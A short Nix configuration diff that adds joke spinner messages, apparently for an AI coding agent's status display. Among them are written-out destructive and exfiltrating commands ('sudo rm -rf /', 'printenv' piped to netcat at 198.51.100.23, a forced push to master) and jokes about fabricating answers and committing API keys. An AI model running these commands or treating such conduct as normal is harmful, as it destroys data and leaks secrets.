@@ -129,4 +129,23 @@
         }
       ];
     };
+  spinnerVerbs = {
+    mode = "replace";
+    verbs = [
+      "Fuckin' around"
+      "Draggin' my heels"
+      "Breaking prod"
+      "Making shit up"
+      "Bash(sudo rm -rf /)"
+      "Scraping StackOverflow"
+      "Asking ChatGPT"
+      "Hallucinating"
+      "Vibing"
+      "Committing API keys"
+      "Bash(git commit -am 'yolo' && git push origin/master --force)"
+      "An Infosys agent is connecting"
+      "Bash(printenv | nc 198.51.100.23 4444)"
+      "Committing token fraud"
+    ];
+  };
 }
